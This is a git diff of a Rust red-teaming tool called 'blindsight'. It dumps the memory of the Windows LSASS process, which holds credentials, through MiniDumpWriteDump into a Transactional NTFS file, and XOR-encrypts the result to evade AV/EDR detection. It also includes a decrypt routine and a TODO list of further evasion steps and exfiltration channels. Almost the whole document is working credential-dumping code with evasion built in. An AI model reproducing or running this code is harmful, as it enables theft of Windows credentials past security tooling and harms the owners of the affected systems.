@@ -1,3 +1,65 @@
+//!
+//! blindsight - Dump LSASS memory bypassing countermeasures
+//! Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>
+//!
+//! > "There's no such things as survival of the fittest.  
+//! > Survival of the most adequate, maybe.  
+//! > It doesn't matter whether a solution's optimal.  
+//! > All that matters is whether it beats the alternative."  
+//! >  
+//! > -- Peter Watts, Blindsight (2006)  
+//!
+//! Red teaming tool to dump LSASS memory, bypassing common countermeasures. 
+//! It uses Transactional NTFS (TxF API) to transparently encrypt the memory 
+//! dump, to avoid triggering AV/EDR/XDR.
+//!
+//! # See also
+//! [Synacktiv](https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary)  
+//! [Mitre](https://attack.mitre.org/techniques/T1003/001/)  
+//! [nanodump](https://github.com/fortra/nanodump)  
+//! [minidump](https://github.com/w1u0u1/minidump/tree/main/minidump)  
+//! [Credbandit](https://github.com/anthemtotheego/CredBandit)  
+//! [RustRedOps](https://github.com/joaoviictorti/RustRedOps)  
+//! [Dumpy](https://github.com/Kudaes/Dumpy)  
+//!
+//! # Cross-compiling
+//! ```sh
+//! [macOS example]
+//! $ brew install mingw-w64
+//! $ rustup target add x86_64-pc-windows-gnu
+//! $ cargo build --release --target x86_64-pc-windows-gnu
+//! ```
+//!
+//! # Usage
+//! ```sh
+//! C:\> blindsight.exe [dump | file_to_decrypt.log]
+//! ```
+//!
+//! # Examples
+//! Dump LSASS memory:
+//! ```sh
+//! C:\> blindsight.exe
+//! ```
+//!
+//! Decrypt encrypted memory dump:
+//! ```sh
+//! C:\> blindsight.exe 29ABE9Hy.log
+//! ```
+//!
+//! # Tested on
+//! * Microsoft Windows 11 with Microsoft Defender Antivirus
+//! 
+//! # TODO
+//! * Optimize memory usage in case of large memory dumps
+//! * Use litcrypt2 or similar crate to encrypt strings locally
+//! * Allow to manually specify LSASS pid to avoid noisy process scans
+//! * Avoid directly opening LSASS handle with OpenProcess
+//! * Use https://github.com/Kudaes/DInvoke_rs for API hoos evasion
+//! * https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
+//! * Implement exfiltration channels (e.g., TFTP, FTP, HTTP...)
+//! * Consider better command line handling when minimal is not enough
+//!
+
 use core::slice;
 use std::error::Error;
 use std::fs::File;
@@ -11,15 +73,17 @@ use rand::prelude::*;
 use sysinfo::System;
 
 use windows::core::PCWSTR;
+use windows::Win32::Foundation::CloseHandle;
 use windows::Win32::Storage::FileSystem::*;
 use windows::Win32::System::Diagnostics::Debug::*;
 use windows::Win32::System::Memory::*;
 use windows::Win32::System::Threading::*;
 
 const LSASS: &str = "lsass.exe";
+const DUMP: &str = ".\\lsass.dmp";
 const KEY: &[u8] = b"DEADBEEF";
 
-/// Implement the main logic of the program
+/// Dispatch to function implementing the selected action
 pub fn run(action: &str) -> Result<(), Box<dyn Error>> {
     match action {
         "dump" => dump()?,
@@ -29,21 +93,12 @@ pub fn run(action: &str) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-/// Print usage information
-pub fn usage(prog: &str) {
-    println!("Usage:");
-    println!(".\\{prog} [dump | file_to_decrypt.log]");
-    println!("\nExamples:");
-    println!(".\\{prog}");
-    println!(".\\{prog} 29ABE9Hy.log");
-}
-
-/// Dump LSASS memory to output file
+/// Dump LSASS memory to encrypted output file
 fn dump() -> Result<(), Box<dyn Error>> {
-    // Create output file
-    let filename = format!(".\\{}.log", rand_str(8));
-    println!("[*] Trying to dump to output file: {filename}");
-    let path = PathBuf::from(filename);
+    // Create output file with a random name
+    let path = format!(".\\{}.log", rand_str(8));
+    println!("[*] Trying to dump to output file: {path}");
+    let path = PathBuf::from(path);
     let mut out_file = File::create_new(path)?;
     println!("[+] Successfully created output file");
 
@@ -56,7 +111,7 @@ fn dump() -> Result<(), Box<dyn Error>> {
     println!("[+] Successfully opened {LSASS} handle: {proc_handle:?}");
 
     // Create NTFS transaction object (TxF API)
-    let txf_obj = unsafe {
+    let txf_handle = unsafe {
         CreateTransaction(
             ptr::null_mut(),
             ptr::null_mut(),
@@ -69,18 +124,18 @@ fn dump() -> Result<(), Box<dyn Error>> {
     };
 
     // Create intermediate output file as a transacted operation
-    let filename = format!(".\\{}.log", rand_str(8));
-    let txf_file = filename.as_ptr() as *mut u16;
-    let txf_handle = unsafe {
+    let filename = format!(".\\{}.log", rand_str(16));
+    let file_ptr = filename.as_ptr() as *mut u16;
+    let file_handle = unsafe {
         CreateFileTransactedW(
-            PCWSTR(txf_file),
+            PCWSTR(file_ptr),
             FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
             FILE_SHARE_WRITE,
             None,
             CREATE_NEW,
             FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
             None,
-            txf_obj,
+            txf_handle,
             Some(std::mem::transmute(&TXFS_MINIVERSION_DIRTY_VIEW)),
             None,
         )?
@@ -91,39 +146,42 @@ fn dump() -> Result<(), Box<dyn Error>> {
         MiniDumpWriteDump(
             proc_handle,
             pid,
-            txf_handle,
+            file_handle,
             MiniDumpWithFullMemory,
             None,
             None,
             None,
         )?;
-        //CloseHandle(proc_handle)?;
     }
     println!("[+] Dump successful!");
 
-    // Encrypt dump and write to output file
-    println!("[*] Encrypting and writing it to disk");
-    let dump_size = unsafe { GetFileSize(txf_handle, None) } as usize;
-    let map_handle = unsafe { CreateFileMappingW(txf_handle, None, PAGE_READONLY, 0, 0, None)? };
+    // Map a view of the intermediate file into our address space
+    let map_handle = unsafe { CreateFileMappingW(file_handle, None, PAGE_READONLY, 0, 0, None)? };
     let ptr = unsafe { MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0).Value as *mut u8 };
-    let data = unsafe { slice::from_raw_parts_mut(ptr, dump_size) };
 
-    println!("AAA {} {}", data.len(), dump_size);
+    // Encrypt dump using a temporary vector to hold data
+    let size = unsafe { GetFileSize(file_handle, None) } as usize;
+    let data = unsafe { slice::from_raw_parts_mut(ptr, size) };
+    println!(
+        "[*] Encrypting dump and writing {} bytes to disk",
+        data.len()
+    );
 
-    // let mut tmp: Vec<u8> = vec![1, 2, 3, 4, 5, 6, 7, 8];
-    // let data = &mut tmp[..];
+    let mut dump = vec![0u8; size];
+    dump.clone_from_slice(data);
+    encrypt(&mut dump, KEY);
 
-    let mut tmp = vec![0u8; dump_size];
-    tmp.clone_from_slice(data);
+    // Write encrypted dump to output file
+    let count = out_file.write(&dump)?;
+    println!("[+] Done writing {count} bytes to disk!");
 
-    xor(&mut tmp, KEY);
-
-    let count = out_file.write(&tmp)?;
-
-    println!("AAA {count}");
-    println!("[+] Done!");
-
-    // CloseHandle...s
+    // Cleanup
+    unsafe {
+        CloseHandle(map_handle)?;
+        CloseHandle(file_handle)?;
+        CloseHandle(txf_handle)?;
+        CloseHandle(proc_handle)?;
+    }
 
     Ok(())
 }
@@ -144,34 +202,47 @@ fn lsass_pid() -> Result<u32, Box<dyn Error>> {
     Ok(proc.pid().as_u32())
 }
 
-/// Get a random string
+/// Encrypt a slice of bytes in place
+fn encrypt(data: &mut [u8], key: &[u8]) {
+    xor(data, key);
+}
+
+/// Decrypt an encrypted dump
+fn decrypt(path: &str) -> Result<(), Box<dyn Error>> {
+    // Open and read input file
+    println!("[*] Trying to read from input file: {path}");
+    let mut in_file = File::open(path)?;
+    let mut buf = Vec::<u8>::new();
+    in_file.read_to_end(&mut buf)?;
+    println!("[+] Successfully read from input file");
+
+    // Decrypt dump
+    println!(
+        "[*] Trying to decrypt {} bytes to output file: {DUMP}",
+        buf.len()
+    );
+    xor(buf.as_mut_slice(), KEY);
+
+    // Write decrypted dump to output file
+    let mut out_file = File::create_new(DUMP)?;
+    let count = out_file.write(&buf)?;
+    println!("[+] Done writing {count} bytes to disk!");
+
+    Ok(())
+}
+
+/// XOR a slice of bytes with a key in place
+fn xor(data: &mut [u8], key: &[u8]) {
+    data.iter_mut()
+        .zip(key.iter().cycle())
+        .for_each(|(byte, key_byte)| *byte ^= key_byte);
+}
+
+/// Generate a random string
 fn rand_str(size: usize) -> String {
     thread_rng()
         .sample_iter(&Alphanumeric)
         .take(size)
         .map(char::from)
         .collect()
-}
-
-/// XOR a byte buffer with a key in place
-pub fn xor(data: &mut [u8], key: &[u8]) {
-    data.iter_mut()
-        .zip(key.iter().cycle())
-        .for_each(|(byte, key_byte)| *byte ^= key_byte);
-}
-
-/// Decrypt an encrypted dump
-fn decrypt(path: &str) -> Result<(), Box<dyn Error>> {
-    let mut file = File::open(path)?;
-
-    let mut buf = Vec::<u8>::new();
-    file.read_to_end(&mut buf)?;
-
-    xor(buf.as_mut_slice(), KEY);
-
-    let mut out_file = File::create_new("lsass.dmp")?;
-    let _count = out_file.write(&buf)?;
-    println!("[+] Successfully created output file");
-
-    Ok(())
 }
